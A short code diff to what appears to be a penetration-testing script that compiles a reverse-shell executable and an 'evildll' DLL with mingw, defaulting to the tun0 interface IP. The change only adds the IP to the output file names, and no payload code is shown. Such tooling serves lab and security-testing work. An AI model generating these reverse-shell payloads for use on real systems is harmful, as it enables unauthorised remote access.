@@ -62,8 +62,9 @@ def main():
     port = args.port if args.port else 443
     ip = args.ip if args.ip else get_tun0_ip()
 
-    exe_file_name = f"reverse-{port}.exe"
-    dll_compiled_file_name = f"evildll-{port}.dll"
+    ip_name = ip.replace(".", "-")
+    exe_file_name = f"reverse-{port}-{ip_name}.exe"
+    dll_compiled_file_name = f"evildll-{port}-{ip_name}.dll"
     dll_compile_command = f"x86_64-w64-mingw32-gcc {DLL_CODE_FILE_NAME} --shared -o {dll_compiled_file_name}"
 
     if not ip:
